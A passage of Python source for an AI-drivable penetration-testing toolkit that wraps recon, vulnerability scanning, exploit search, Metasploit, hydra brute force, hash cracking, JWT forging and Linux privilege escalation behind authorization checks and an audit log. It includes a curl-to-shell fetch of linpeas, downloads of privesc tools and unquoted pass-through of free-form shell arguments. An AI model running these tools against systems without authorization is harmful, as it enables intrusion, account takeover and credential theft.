                    r = json.loads(ln); recs.append(r)
                    existing.add((r.get("host"), r.get("port"), r.get("proto")))
                except Exception:
                    pass
        added = 0
        os.makedirs(WORKSPACE, exist_ok=True)
        with open(INVENTORY, "a", encoding="utf-8") as fh:
            for port, proto, svc in rows:
                key = (host, port, proto)
                if key in existing:
                    continue
                existing.add(key)
                fh.write(json.dumps({
                    "host": host, "port": port, "proto": proto, "service": svc,
                    "source": title,
                    "ts": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                }, ensure_ascii=False) + "\n")
                added += 1
    except OSError:
        pass


def tool_inventory(args: dict) -> str:
    """Query the asset inventory (hosts.jsonl) built automatically from recon/enum/
    portscan output: hosts and their open ports/services. Filter by host, service, or
    port. This is the queryable target base — no grepping notes. action=list (default)."""
    if not os.path.exists(INVENTORY):
        return "inventory empty — run recon / portscan / netenum on authorized targets first."
    recs = []
    for ln in open(INVENTORY, encoding="utf-8"):
        try:
            recs.append(json.loads(ln))
        except Exception:
            pass
    fh = str(args.get("host", "")).strip().lower()
    fs = str(args.get("service", "")).strip().lower()
    fp = str(args.get("port", "")).strip()
    if fh:
        recs = [r for r in recs if fh in str(r.get("host", "")).lower()]
    if fs:
        recs = [r for r in recs if fs in str(r.get("service", "") or "").lower()]
    if fp:
        recs = [r for r in recs if str(r.get("port", "")) == fp]
    if not recs:
        return "no inventory rows match that filter."
    by_host = {}
    for r in recs:
        by_host.setdefault(r.get("host", "?"), []).append(r)
    lines = ["asset inventory (" + str(len(recs)) + " rows, " + str(len(by_host)) + " hosts):"]
    for host in sorted(by_host):
        ports = sorted([p for p in by_host[host] if p.get("port")], key=lambda r: r.get("port") or 0)
        if ports:
            lines.append("  " + host + ": " + ", ".join(
                str(r["port"]) + "/" + str(r.get("proto") or "tcp") + " " + str(r.get("service") or "?")
                for r in ports))
        else:
            lines.append("  " + host + ": (host seen, no ports recorded)")
    return "\n".join(lines)


def _audit(title: str, auth: str, cmd: str, rc: int, where: str, target: str = "") -> None:
    """Append-only audit trail of every offensive command: who authorized it, what
    ran, where, and the exit code. UTC. A best-effort write — a logging failure
    never blocks the operation, but the trail is what makes a run defensible."""
    try:
        os.makedirs(WORKSPACE, exist_ok=True)
        rec = {
            "ts_utc": datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds"),
            "title": title, "target": target, "authorized_by": auth,
            "cmd": cmd, "exit": rc, "via": where,
        }
        with open(AUDIT_FILE, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(rec, ensure_ascii=False) + "\n")
    except OSError:
        pass


def _off_report(title: str, auth: str, cmd: str, out: str, rc: int, where: str,
                target: str = "") -> str:
    _audit(title, auth, cmd, rc, where, target)
    _inventory_harvest(title, cmd, out)
    return _truncate(f"[{title} | authorized-by: {auth} | via {where}]\n$ {cmd}\n\n{out}\n"
                     f"exit={rc}")


def _have(binname: str) -> bool:
    o, rc, _ = _off_run(f"command -v {shlex.quote(binname)} >/dev/null 2>&1 && echo yes", 15)
    return "yes" in o


# 1. recon / OSINT — subdomains, DNS, tech, live hosts (passive-first)
def _web_auth_headers(args: dict) -> list:
    """(name, value) auth headers for authenticated web scans, from cookie /
    auth_header / bearer / headers args. Lets nuclei & wpscan reach behind a login
    instead of only seeing the unauthenticated surface (review P2-6)."""
    out = []
    cookie = str(args.get("cookie", "")).strip()
    if cookie:
        out.append(("Cookie", cookie))
    auth = str(args.get("auth_header", "") or args.get("bearer", "")).strip()
    if auth:
        val = auth if (":" in auth or auth.lower().startswith("bearer ")) else "Bearer " + auth
        out.append(("Authorization", val))
    hdrs = args.get("headers") or []
    if isinstance(hdrs, str):
        hdrs = [hdrs]
    for h in hdrs:
        if ":" in str(h):
            k, v = str(h).split(":", 1)
            out.append((k.strip(), v.strip()))
    return out


def tool_recon(args: dict) -> str:
    target = str(args.get("target", "") or args.get("domain", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    dom = _bare_host(target)
    extra = str(args.get("extra", "")).strip()
    q = shlex.quote(dom)
    cmd = (
        f"echo '== subfinder =='; command -v subfinder >/dev/null 2>&1 && subfinder -silent -d {q} 2>/dev/null | tee /tmp/_subs.txt || echo '(subfinder not installed)'; "
        f"echo '== dns =='; dig +short {q} A; dig +short {q} MX; "
        f"echo '== SPF/DMARC =='; dig +short TXT {q}; dig +short TXT _dmarc.{q}; "
        f"echo '== whatweb =='; command -v whatweb >/dev/null 2>&1 && whatweb -q {q} 2>/dev/null || echo '(whatweb not installed)'; "
        f"echo '== live hosts (httpx) =='; command -v httpx >/dev/null 2>&1 && ( [ -s /tmp/_subs.txt ] && httpx -silent -title -tech-detect -status-code < /tmp/_subs.txt 2>/dev/null | head -50 ) || echo '(httpx not installed or no subdomains found)'"
        + (f"; {extra}" if extra else "")
    )
    out, rc, where = _off_run(cmd, min(OFFENSIVE_TIMEOUT, 900))
    return _off_report("recon", args.get("authorization", ""), "recon " + dom, out, rc, where)


# 1b. jwt — JSON Web Token testing/forging with jwt_tool (in the toolbox)
def tool_jwt(args: dict) -> str:
    """JWT testing/forging via jwt_tool. Operates on a supplied token STRING — it does
    not hit a live endpoint. modes: decode (default), crack, sign, tamper, exploit."""
    token = str(args.get("token", "")).strip()
    if not token:
        return ("jwt: ERROR — no 'token' given, so NOTHING ran. Pass the JWT string. modes: "
                "decode (default; parse header/payload + checks) | crack ('wordlist', dictionary "
                "attack on the HMAC secret) | sign ('secret' [+'algorithm'], re-sign) | tamper "
                "('claim'+'value' [+'secret'], set a payload claim and optionally re-sign) | "
                "exploit ('exploit': none|null|blank|psychic|key_confusion(+'pubkey')|"
                "jwks_spoof(+'jwks_url')). Do NOT answer from memory.")
    q = shlex.quote
    mode = str(args.get("mode", "decode")).strip().lower()
    parts = ["jwt_tool", q(token)]
    if mode == "decode":
        pass
    elif mode == "crack":
        wl = str(args.get("wordlist", "")).strip() or "/usr/share/wordlists/rockyou.txt"
        parts += ["-C", "-d", q(wl)]
    elif mode == "sign":
        sec = str(args.get("secret", "")).strip()
        if not sec:
            return "jwt sign: needs 'secret' (the HMAC key to sign with)."
        alg = str(args.get("algorithm", "hs256")).strip().lower()
        parts += ["-S", q(alg), "-p", q(sec)]
    elif mode == "tamper":
        claim = str(args.get("claim", "")).strip()
        value = str(args.get("value", "")).strip()
        if not claim:
            return "jwt tamper: needs 'claim' and 'value' (the payload claim to set, e.g. admin=true)."
        parts += ["-I", "-pc", q(claim), "-pv", q(value)]
        sec = str(args.get("secret", "")).strip()
        if sec:
            alg = str(args.get("algorithm", "hs256")).strip().lower()
            parts += ["-S", q(alg), "-p", q(sec)]
    elif mode == "exploit":
        ex = str(args.get("exploit", "")).strip().lower()
        xmap = {"none": "a", "null": "n", "blank": "b", "psychic": "p",
                "jwks_spoof": "s", "inline_jwks": "i", "key_confusion": "k"}
        code = xmap.get(ex)
        if not code:
            return "jwt exploit: 'exploit' must be one of " + ", ".join(xmap) + "."
        parts += ["-X", code]
        if ex == "key_confusion":
            pk = str(args.get("pubkey", "")).strip()
            if not pk:
                return ("jwt exploit key_confusion: needs 'pubkey' — path (inside the toolbox) to the "
                        "server's RSA public key. Fetch it first, e.g. from /.well-known/jwks or the TLS cert.")
            parts += ["-pk", q(pk)]
        elif ex == "jwks_spoof":
            ju = str(args.get("jwks_url", "")).strip()
            if ju:
                parts += ["-ju", q(ju)]
    else:
        return "jwt: unknown 'mode' " + q(mode) + " (decode|crack|sign|tamper|exploit)."
    extra = str(args.get("extra", "")).strip()
    if extra:
        parts.append(extra)
    out, rc, where = _off_run(" ".join(parts), min(OFFENSIVE_TIMEOUT, 1800), need="jwt_tool")
    return _off_report("jwt", args.get("authorization", "token-manipulation (no live target)"),
                       " ".join(parts), out, rc, where)


# 1c. glab — GitLab CLI against an authorized instance (API, repos, CI, tokens)
def tool_glab(args: dict) -> str:
    """Drive the GitLab CLI (glab) against an instance you are authorized on. Pass the
    subcommand in 'args' (e.g. 'api /version', 'repo list', 'ci list', 'auth status').
    Provide 'host' (e.g. 127.0.0.1:8929) and 'token' — for the lab, source
    ~/sygnif-pentest/lab-creds.env and pass $GL19_URL host + $GL19_TOKEN."""
    sub = str(args.get("args", "")).strip()
    if not sub:
        return ("glab: no 'args'. Give a glab subcommand, e.g. \"api /projects\", \"repo list\", "
                "\"ci status\", \"auth status\". Add 'host' (GITLAB_HOST) + 'token' (GITLAB_TOKEN).")
    q = shlex.quote
    host = str(args.get("host", "")).strip().replace("http://", "").replace("https://", "")
    token = str(args.get("token", "")).strip()
    proto = str(args.get("protocol", "")).strip().lower()  # http|https; http lab instances need this
    env = []
    if host:
        env.append("GITLAB_HOST=" + q(host))
    if token:
        env.append("GITLAB_TOKEN=" + q(token))
    # glab defaults to https and errors on a plain-http instance ("HTTP response to HTTPS client");
    # set the per-host api_protocol first when the caller says http.
    pre = ""
    if host and proto == "http":
        pre = "glab config set -h " + q(host) + " api_protocol http >/dev/null 2>&1; "
    cmd = pre + (" ".join(env) + " " if env else "") + "glab " + sub
    out, rc, where = _off_run(cmd, min(OFFENSIVE_TIMEOUT, 600), need="glab")
    return _off_report("glab", args.get("authorization", "gitlab (own/authorized instance)"),
                       "glab " + sub, out, rc, where)


# 1d. graphw00f — GraphQL engine detection + fingerprinting
def tool_graphw00f(args: dict) -> str:
    """Fingerprint a GraphQL endpoint's server engine (Apollo, Hasura, graphql-yoga, …)
    with graphw00f — the precursor to engine-specific attacks. Requires 'target'+'authorization'."""
    target = str(args.get("target", "") or args.get("url", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    q = shlex.quote
    parts = ["graphw00f", "-d", "-f", "-t", q(target)]
    extra = str(args.get("extra", "")).strip()
    if extra:
        parts.append(extra)
    out, rc, where = _off_run(" ".join(parts), min(OFFENSIVE_TIMEOUT, 600), need="graphw00f")
    return _off_report("graphw00f", args.get("authorization", ""), " ".join(parts), out, rc, where, target=target)


# 1e. clairvoyance — recover a GraphQL schema when introspection is disabled
def tool_clairvoyance(args: dict) -> str:
    """Recover a GraphQL schema via field-suggestion brute force (clairvoyance) when
    introspection is turned off. Requires 'target'+'authorization'. 'wordlist' optional
    (a field-name list); 'output' writes JSON schema to a path in the workspace mount."""
    target = str(args.get("target", "") or args.get("url", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    q = shlex.quote
    parts = ["clairvoyance", q(target)]
    wl = str(args.get("wordlist", "")).strip()
    if wl:
        parts += ["-w", q(wl)]
    out_path = str(args.get("output", "")).strip()
    if out_path:
        parts += ["-o", q(out_path)]
    for _k, _v in _web_auth_headers(args):
        parts += ["-H", q(_k + ": " + _v)]
    if str(args.get("insecure", "")).strip().lower() in ("1", "true", "yes"):
        parts.append("-k")
    extra = str(args.get("extra", "")).strip()
    if extra:
        parts.append(extra)
    out, rc, where = _off_run(" ".join(parts), min(OFFENSIVE_TIMEOUT, 1800), need="clairvoyance")
    return _off_report("clairvoyance", args.get("authorization", ""), " ".join(parts), out, rc, where, target=target)


# 2. nuclei — templated vulnerability scan (community + optional Wordfence WP CVEs)
def tool_nuclei(args: dict) -> str:
    target = str(args.get("target", "") or args.get("url", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    tags = str(args.get("tags", "")).strip()
    sev = str(args.get("severity", "")).strip()
    extra = str(args.get("extra", "")).strip()
    xtpl = os.environ.get("SYGNIF_PY_NUCLEI_EXTRA_TEMPLATES", "").strip()
    parts = [f"nuclei -u {shlex.quote(target)} -silent -nc"]
    if tags:
        parts.append(f"-tags {shlex.quote(tags)}")
    if sev:
        parts.append(f"-severity {shlex.quote(sev)}")
    if xtpl:
        parts.append(f"-t {shlex.quote(xtpl)}")  # e.g. the nuclei-wordfence-cve template dir
    for _k, _v in _web_auth_headers(args):
        parts.append("-H " + shlex.quote(_k + ": " + _v))
    if extra:
        parts.append(extra)
    out, rc, where = _off_run(" ".join(parts))
    if rc != 0 and not _have("nuclei"):
        return ("nuclei not installed — `SYGNIF_PY_KALI_METAPACKAGE=kali-tools-web sygnif kali-setup` "
                "or `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest`. Add the "
                "Wordfence WP CVE templates and point SYGNIF_PY_NUCLEI_EXTRA_TEMPLATES at them.")
    return _off_report("nuclei", args.get("authorization", ""), " ".join(parts), out, rc, where)


# 3. wpscan — full WordPress enumeration (structured wp_vulnscan's active sibling)
def tool_wpscan(args: dict) -> str:
    target = str(args.get("target", "") or args.get("url", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    enum = str(args.get("enumerate", "vp,vt,u,cb,dbe")).strip()
    tok = os.environ.get("WPSCAN_API_TOKEN", "").strip()
    extra = str(args.get("extra", "")).strip()
    parts = [f"wpscan --url {shlex.quote(target)} --no-banner --format cli-no-color",
             f"--enumerate {shlex.quote(enum)}", "--random-user-agent"]
    if tok:
        parts.append(f"--api-token {shlex.quote(tok)}")
    _cookie = str(args.get("cookie", "")).strip()
    if _cookie:
        parts.append("--cookie-string " + shlex.quote(_cookie))
    _hdrs = [k + ": " + v for k, v in _web_auth_headers(args) if k != "Cookie"]
    if _hdrs:
        parts.append("--headers " + shlex.quote("\n".join(_hdrs)))
    if extra:
        parts.append(extra)
    out, rc, where = _off_run(" ".join(parts), need=("wpscan",))
    if not tok and "--api-token" not in out:
        out += "\n[no WPSCAN_API_TOKEN set — enumeration ran but CVE data is limited; free token at wpscan.com/api]"
    return _off_report("wpscan", args.get("authorization", ""), " ".join(parts), out, rc, where)


# 4. exploit_search — offline Exploit-DB lookup (searchsploit). DB search, ungated.
def _poc_search(query: str, cve: str = "") -> str:
    """Find public exploit/PoC repos on GitHub (keyless). GitHub repo-search by stars
    is primary (surfaces high-signal PoCs that Exploit-DB lacks, e.g. amlweems/xzbot
    for CVE-2024-3094); the nomi-sec PoC-in-GitHub index (CVE-keyed) supplements it.
    Star-ranked, deduped. Set GITHUB_TOKEN for a higher unauthenticated search rate."""
    hdr = {"Accept": "application/vnd.github+json"}
    tok = os.environ.get("GITHUB_TOKEN", "") or os.environ.get("GH_TOKEN", "")
    if tok:
        hdr["Authorization"] = "token " + tok
    found: dict = {}
    gq = urllib.parse.quote(cve or query)
    body, status, _ = _http_get(
        "https://api.github.com/search/repositories?q=" + gq + "&sort=stars&order=desc&per_page=12",
        headers=hdr)
    if status == 200:
        try:
            for r in (json.loads(body).get("items") or []):
                fn = r.get("full_name", "")
                if fn:
                    found[fn] = {"stars": int(r.get("stargazers_count", 0) or 0),
                                 "url": r.get("html_url", ""),
                                 "desc": (r.get("description") or "").strip(),
                                 "upd": str(r.get("pushed_at", ""))[:10]}
        except Exception:  # noqa: BLE001
            pass
    if cve:
        body, status, _ = _http_get("https://poc-in-github.motikan2010.net/api/v1/?cve_id=" + cve)
        if status == 200:
            try:
                for p in (json.loads(body).get("pocs") or []):
                    fn = p.get("full_name", "")
                    if not fn:
                        continue
                    st = int(p.get("stargazers_count", 0) or 0)
                    cur = found.get(fn)
                    if not cur or st > cur["stars"]:
                        found[fn] = {"stars": st, "url": p.get("html_url", ""),
                                     "desc": (p.get("description") or "").strip(),
                                     "upd": str(p.get("updated_at", ""))[:10]}
            except Exception:  # noqa: BLE001
                pass
    if not found:
        return ("  (no public PoC repos found, or GitHub rate-limited — try the CVE id, or set "
                "GITHUB_TOKEN for a higher rate.)")
    lines = []
    for r in sorted(found.values(), key=lambda x: -x["stars"])[:12]:
        lines.append("  * %-5d %s  (upd %s)" % (r["stars"], r["url"], r["upd"] or "?"))
        if r["desc"]:
            lines.append("        " + r["desc"][:100])
    return "\n".join(lines)


def tool_exploit_search(args: dict) -> str:
    query = str(args.get("query", "") or args.get("cve", "")).strip()
    if not query:
        return "exploit_search: give a 'query' (product/version) or a 'cve' id."
    is_cve = bool(re.fullmatch(r"(?i)cve-\d{4}-\d+", query))
    cmd = (f"searchsploit --cve {shlex.quote(query.upper())}" if is_cve
           else f"searchsploit {shlex.quote(query)}")
    out, rc, where = _off_run(cmd, 120)
    if rc != 0 and not _have("searchsploit"):
        edb = ("[exploit-db] searchsploit not installed (part of exploitdb; "
               "`sygnif kali-setup` or apt install exploitdb).")
    else:
        edb = _off_report("exploit_search (Exploit-DB)", "n/a (offline DB)", cmd, out, rc, where)
    pocs = _poc_search(query, query.upper() if is_cve else "")
    return _truncate(edb + "\n\n== public PoCs (GitHub — community code, UNVETTED: read before "
                     "running; execute deliberately via the shell/kali tool on an authorized target) ==\n"
                     + pocs)


# 5. metasploit driver — run an msf module non-interactively (exploitation framework)
def tool_msf(args: dict) -> str:
    target = str(args.get("target", "") or args.get("rhosts", "")).strip()
    module = str(args.get("module", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    if not module:
        return ("msf: give a 'module' (e.g. 'auxiliary/scanner/http/wordpress_login_enum') and any "
                "'options' dict. Validate the module and blast radius before firing; least-destructive first.")
    opts = args.get("options", {}) or {}
    setlines = [f"set RHOSTS {shlex.quote(target)}"]
    for k, v in opts.items():
        setlines.append(f"set {k} {shlex.quote(str(v))}")
    action = str(args.get("action", "run")).strip() or "run"
    rc_script = "; ".join([f"use {module}"] + setlines + [action, "exit"])
    cmd = f"msfconsole -q -x {shlex.quote(rc_script)}"
    out, rc, where = _off_run(cmd)
    return _off_report("metasploit", args.get("authorization", ""), cmd, out, rc, where)


# 6. bruteforce — online credential testing (hydra). Loud + can lock accounts.
def tool_bruteforce(args: dict) -> str:
    target = str(args.get("target", "")).strip()
    service = str(args.get("service", "")).strip()  # ssh, ftp, http-post-form, wordpress...
    g = _authz(args, target)
    if g:
        return g
    if not service:
        return ("bruteforce: give a 'service' (ssh|ftp|smb|http-get|http-post-form|...), plus "
                "'userlist'+'passlist' (or 'user'/'password'). Online brute is LOUD and can lock "
                "accounts — authorized + rate-agreed engagements only.")
    users = str(args.get("userlist", "")).strip()
    passl = str(args.get("passlist", "")).strip()
    u = f"-L {shlex.quote(users)}" if users else (f"-l {shlex.quote(args['user'])}" if args.get("user") else "")
    p = f"-P {shlex.quote(passl)}" if passl else (f"-p {shlex.quote(args['password'])}" if args.get("password") else "")
    if not u or not p:
        return "bruteforce: need a user source (userlist|user) and a password source (passlist|password)."
    extra = str(args.get("extra", "")).strip()
    path = str(args.get("path", "")).strip()
    cmd = f"hydra {u} {p} -t 4 -f {shlex.quote(target)} {shlex.quote(service)} {path} {extra}".strip()
    out, rc, where = _off_run(cmd)
    if rc != 0 and not _have("hydra"):
        return "hydra not installed (`sygnif kali-setup` or apt install hydra)."
    return _off_report("bruteforce", args.get("authorization", ""), cmd, out, rc, where)


# 7. crack — offline hash cracking (hashcat, else john). Operate on hashes you are
#    authorized to hold; the 'target' names the engagement/host they came from.
def tool_crack(args: dict) -> str:
    target = str(args.get("target", "") or "offline-hashes").strip()
    g = _authz(args, target)
    if g:
        return g
    hashfile = str(args.get("hashfile", "")).strip()
    if not hashfile:
        return "crack: give a 'hashfile' path, a hashcat 'mode' (e.g. 22000 WPA, 0 MD5, 1000 NTLM), and a 'wordlist'."
    mode = str(args.get("mode", "")).strip()
    wl = str(args.get("wordlist", "/usr/share/wordlists/rockyou.txt")).strip()
    extra = str(args.get("extra", "")).strip()
    if _have("hashcat") and mode:
        cmd = f"hashcat -m {shlex.quote(mode)} {shlex.quote(hashfile)} {shlex.quote(wl)} --quiet {extra}".strip()
    else:
        cmd = f"john --wordlist={shlex.quote(wl)} {shlex.quote(hashfile)} {extra}".strip()
    out, rc, where = _off_run(cmd)
    return _off_report("crack", args.get("authorization", ""), cmd, out, rc, where)


# 8. postexploit — LOCAL privilege-escalation enumeration on an authorized host.
#    Enumeration only (no persistence / no lateral movement). RoE-gated.
def tool_postexploit(args: dict) -> str:
    target = str(args.get("target", "") or "localhost").strip()
    g = _authz(args, target)
    if g:
        return g
    if _have("linpeas") or _have("linpeas.sh"):
        cmd = "linpeas -q 2>/dev/null || linpeas.sh -q"
    elif str(args.get("fetch", "")).lower() in ("1", "true", "yes"):
        cmd = "curl -fsSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"
    else:
        # built-in quick local enum, no downloads
        cmd = ("echo '== id =='; id; echo '== sudo -l =='; sudo -n -l 2>&1 | head; "
               "echo '== kernel =='; uname -a; echo '== SUID =='; find / -perm -4000 -type f 2>/dev/null | head -40; "
               "echo '== world-writable dirs =='; find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys' | head -30; "
               "echo '== listening =='; ss -tlnp 2>/dev/null | head -30; echo '== cron =='; ls -la /etc/cron* 2>/dev/null")
    out, rc, where = _off_run(cmd, 600)
    return _off_report("postexploit(local-enum)", args.get("authorization", ""), "local enumeration", out, rc, where)


# 8b. privesc — LOCAL privilege escalation on an AUTHORIZED foothold. Turns a
#     shell into root/owner. Modes:
#       suggest   (default) linux-exploit-suggester-2 — candidate kernel exploits (READ-ONLY)
#       gtfo      GTFOBins lookup for one binary you hold sudo/SUID/caps on (READ-ONLY, keyless)
#       spy       pspy — watch root cron/processes for a writable-run-as-root path (READ-ONLY)
#       container deepce — Docker/container escape enumeration (READ-ONLY)
#       auto      traitor + GTFONow — enumerate EXPLOITABLE sudo/suid/cap/GTFOBins vectors;
#                 actually firing one spawns a root shell and needs an interactive PTY.
#     All modes require 'authorization'; SCOPE.md-confined. Candidate CVEs are NOT
#     confirmed — verify before firing. Tools are fetched from pinned upstreams to /tmp.
_PRIVESC_SRC = {
    "les2": "https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl",
    "pspy": "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64",
    "deepce": "https://raw.githubusercontent.com/stealthcopter/deepce/main/deepce.sh",
    "traitor": "https://github.com/liamg/traitor/releases/latest/download/traitor-amd64",
    "gtfonow": "https://github.com/Frissi0n/GTFONow/releases/download/v0.3.0/gtfonow.py",
    "gtfobins": "https://raw.githubusercontent.com/GTFOBins/GTFOBins.github.io/master/_gtfobins/",
}


def tool_privesc(args: dict) -> str:
    target = str(args.get("target", "") or "localhost").strip()
    mode = str(args.get("mode", "suggest")).strip().lower()
    g = _authz(args, target)
    if g:
        return g
    auth = args.get("authorization", "")

    if mode == "gtfo":
        b = re.sub(r"[^a-z0-9_.+-]", "", str(args.get("binary", "") or args.get("bin", "")).strip().lower())
        if not b:
            return ("privesc gtfo: give a 'binary' you hold sudo/SUID/capabilities on "
                    "(e.g. find, vim, tar). Returns the GTFOBins escape techniques.")
        body, status, _ = _http_get(_PRIVESC_SRC["gtfobins"] + b)
        if status != 200:
            return (f"privesc gtfo: no GTFOBins entry for '{b}' (HTTP {status}). Not every binary has "
                    "one; try the base name (e.g. 'python' not 'python3.11').")
        return _truncate(f"GTFOBins — {b}  (https://gtfobins.github.io/gtfobins/{b}/)\n\n" + body)

    if mode == "suggest":
        kern = str(args.get("kernel", "")).strip()
        kflag = "-k " + shlex.quote(kern) if kern else ""
        cmd = ("les=/tmp/les2.pl; [ -s $les ] || curl -fsSL " + _PRIVESC_SRC["les2"]
               + " -o $les 2>/dev/null; echo '== target kernel =='; uname -a 2>/dev/null; echo; "
               "echo '== candidate kernel exploits — CANDIDATES, verify before firing =='; "
               "perl $les " + kflag + " 2>/dev/null | head -80")
        out, rc, where = _off_run(cmd, 180, need=("perl", "curl"))
        return _off_report("privesc(suggest)", auth, "linux-exploit-suggester-2", out, rc, where)

    if mode == "spy":
        secs = max(5, min(int(args.get("seconds", 25)), 120))
        cmd = ("p=/tmp/pspy64; [ -s $p ] || curl -fsSL " + _PRIVESC_SRC["pspy"]
               + " -o $p 2>/dev/null; chmod +x $p 2>/dev/null; "
               "echo '== pspy: watching processes/cron for " + str(secs)
               + "s (root-run jobs, writable scripts) =='; "
               "timeout " + str(secs) + " $p -pf -i 1000 2>/dev/null | tail -100")
        out, rc, where = _off_run(cmd, secs + 40, need=("curl",))
        return _off_report("privesc(spy)", auth, "pspy64", out, rc, where)

    if mode == "container":
        cmd = ("d=/tmp/deepce.sh; [ -s $d ] || curl -fsSL " + _PRIVESC_SRC["deepce"]
               + " -o $d 2>/dev/null; echo '== deepce: container-escape enumeration =='; "
               "bash $d --no-color 2>/dev/null | head -140")
        out, rc, where = _off_run(cmd, 300, need=("curl", "bash"))
        return _off_report("privesc(container)", auth, "deepce", out, rc, where)

    if mode == "auto":
        exploit = str(args.get("exploit", "")).lower() in ("1", "true", "yes")
        pre = ("t=/tmp/traitor; [ -s $t ] || curl -fsSL " + _PRIVESC_SRC["traitor"]
               + " -o $t 2>/dev/null; chmod +x $t 2>/dev/null; "
               "gt=/tmp/gtfonow.py; [ -s $gt ] || curl -fsSL " + _PRIVESC_SRC["gtfonow"]
               + " -o $gt 2>/dev/null; ")
        # traitor -a is analysis only (lists exploitable vectors, exploits nothing).
        cmd = (pre + "echo '== traitor: exploitable vectors (analysis, no exploit) =='; "
               "$t -a 2>/dev/null | head -70")
        out, rc, where = _off_run(cmd, 240, need=("curl",))
        rep = _off_report("privesc(auto)", auth, "traitor -a (+ gtfonow fetched)", out, rc, where)
        rep += ("\n\n[GTFONow fetched to /tmp/gtfonow.py — it is interactive without -a and "
                "AUTO-EXPLOITS with -a, so it is not run unattended here. Run it yourself via the "
                "shell tool: `python3 /tmp/gtfonow.py` (enumerate) or `python3 /tmp/gtfonow.py -a` "
                "(auto-exploit; --level 1|2, --risk 1|2).]")
        if exploit:
            rep += ("\n[exploit=true: firing a traitor vector spawns a ROOT SHELL and needs an "
                    "interactive PTY — run `/tmp/traitor -a -p` yourself via the shell tool. This "
                    "tool reports vectors only, it will not drop an unattended root shell.]")
        return rep

    return ("privesc: mode = suggest | gtfo | spy | container | auto.  "
            "suggest=kernel-CVE candidates (LES2); gtfo=GTFOBins lookup for a 'binary'; "
            "spy=pspy process/cron watch; container=deepce escape check; "
            "auto=traitor+GTFONow exploitable-vector analysis. All need target+authorization.")


# 8c. dast — headless dynamic web-app scan driving OWASP ZAP via its REST API.
#     Burp Community cannot be automated (no scan CLI / no REST API); ZAP is the
#     agent-drivable DAST. modes:
#       quick    (default) `zaproxy -cmd -zapit` — fast passive reconnaissance, no daemon
#       baseline daemon + spider + PASSIVE scan only (quiet: no attack payloads sent)
#       active   daemon + spider + ACTIVE scan (sends attack payloads) — louder, authorized only
#     Requires 'target' + 'authorization'; SCOPE.md-confined. Alerts grouped by risk.
_DAST_DRIVER = (
    "import sys, time\n"
    "try:\n"
    "    from zapv2 import ZAPv2\n"
    "except Exception as e:\n"
    "    print('DAST_ERROR: zapv2 client not available (' + str(e) + ')'); sys.exit(3)\n"
    "port, key, target, mode = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]\n"
    "base = 'http://127.0.0.1:' + port\n"
    "zap = ZAPv2(apikey=key, proxies={'http': base, 'https': base})\n"
    "try:\n"
    "    zap.urlopen(target); time.sleep(2)\n"
    "except Exception:\n"
    "    pass\n"
    "try:\n"
    "    sid = zap.spider.scan(target); t0 = time.time()\n"
    "    while int(zap.spider.status(sid)) < 100 and time.time() - t0 < 300:\n"
    "        time.sleep(3)\n"
    "except Exception as e:\n"
    "    print('DAST_ERROR: spider failed: ' + str(e)); sys.exit(4)\n"
    "t0 = time.time()\n"
    "try:\n"
    "    while int(zap.pscan.records_to_scan) > 0 and time.time() - t0 < 120:\n"
    "        time.sleep(2)\n"
    "except Exception:\n"
    "    pass\n"
    "if mode == 'active':\n"
    "    try:\n"
    "        aid = zap.ascan.scan(target); t0 = time.time()\n"
    "        while int(zap.ascan.status(aid)) < 100 and time.time() - t0 < 1200:\n"
    "            time.sleep(5)\n"
    "    except Exception as e:\n"
    "        print('DAST_WARN: active scan issue: ' + str(e))\n"
    "try:\n"
    "    alerts = zap.core.alerts(baseurl=target)\n"
    "except Exception as e:\n"
    "    print('DAST_ERROR: could not read alerts: ' + str(e)); sys.exit(5)\n"
    "order = {'High': 0, 'Medium': 1, 'Low': 2, 'Informational': 3}\n"
    "buckets = {}\n"
    "for a in alerts:\n"
    "    r = a.get('risk', 'Informational'); nm = a.get('alert') or a.get('name') or '?'\n"
    "    b = buckets.setdefault(r, {}); e = b.setdefault(nm, {'count': 0, 'url': a.get('url', ''), 'cwe': a.get('cweid', ''), 'conf': a.get('confidence', '')})\n"
    "    e['count'] += 1\n"
    "print('ZAP DAST (' + mode + ') -- ' + target)\n"
    "print(str(len(alerts)) + ' alert instances across ' + str(sum(len(v) for v in buckets.values())) + ' types')\n"
    "for r in sorted(buckets, key=lambda x: order.get(x, 9)):\n"
    "    items = buckets[r]\n"
    "    print(''); print('== ' + r + ' (' + str(sum(v['count'] for v in items.values())) + ') ==')\n"
    "    for nm in sorted(items, key=lambda n: -items[n]['count']):\n"
    "        v = items[nm]\n"
    "        print('  - ' + nm + '  x' + str(v['count']) + '  CWE-' + str(v['cwe']) + '  conf=' + str(v['conf']))\n"
    "        print('      e.g. ' + str(v['url'])[:120])\n"
)


def tool_dast(args: dict) -> str:
    target = _norm_url(str(args.get("target", "") or args.get("url", "")))
    mode = str(args.get("mode", "quick")).strip().lower()
    g = _authz(args, target)
    if g:
        return g

    if mode == "quick":
        cmd = "zaproxy -cmd -zapit " + shlex.quote(target) + " 2>&1 | tail -60"
        out, rc, where = _off_run(cmd, 300, need=("zaproxy",))
        return _off_report("dast(quick)", args.get("authorization", ""), "zap -zapit " + target, out, rc, where)

    if mode not in ("baseline", "active"):
        return ("dast: mode = quick | baseline | active.  quick=passive recon (zapit); "
                "baseline=spider + passive scan (quiet); active=spider + active scan (sends "
                "attack payloads). All need target + authorization.")

    # baseline / active: spin a headless ZAP daemon, drive it via the REST API, tear it down.
    driver = _DAST_DRIVER
    tmo = 1500 if mode == "active" else 600
    cmd = (
        "PORT=$((8090 + RANDOM % 200)); KEY=sygnifdast$$; SESS=/tmp/zapsess_$$; "
